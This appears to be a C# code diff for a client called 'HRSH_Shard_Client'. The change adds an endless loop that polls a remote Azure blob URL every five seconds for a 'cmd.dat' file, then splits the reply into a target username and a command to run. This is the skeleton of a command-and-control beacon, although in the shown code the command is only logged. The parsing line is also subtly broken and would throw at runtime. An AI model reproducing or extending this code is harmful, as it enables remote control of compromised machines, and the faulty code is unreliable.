@@ -7,6 +7,9 @@ using System.IO;
 using Azure.Storage;
 using Azure.Storage.Blobs;
 using Azure.Storage.Blobs.Models;
+using System.Net;
+using HRSH_Shard_Client.tools;
+using System.Threading;
 
 namespace HRSH_Shard_Client
 {
@@ -19,7 +22,15 @@ namespace HRSH_Shard_Client
         {
             LogEntry("Starting Up");
 
-            DeleteBlob("cmd.dat");
+            LogEntry("Loading Commands.");
+            commandHandler.loadCommands();
+
+            start:
+
+            RunCommand();
+            Thread.Sleep(5000);
+
+            goto start;
         }
 
         // Check if the log file exists before writing anything to it.
@@ -61,6 +72,19 @@ namespace HRSH_Shard_Client
             else
             {
                 LogEntry("Command block not found.");
+            }
+        }
+
+        private static void RunCommand()
+        {
+            string uri = "https://an0maly.blob.core.windows.net/commandbin/cmd.dat";
+            WebClient client = new WebClient();
+            string reply = client.DownloadString(uri);
+            string usrName = reply.Substring(0, reply.IndexOf(':'));
+            string cmd = reply.Substring(reply.IndexOf(':'), reply.Length);
+            if (usrName == "curUsr")
+            {
+                LogEntry("Executing command: " + cmd);
             }
         }
     }
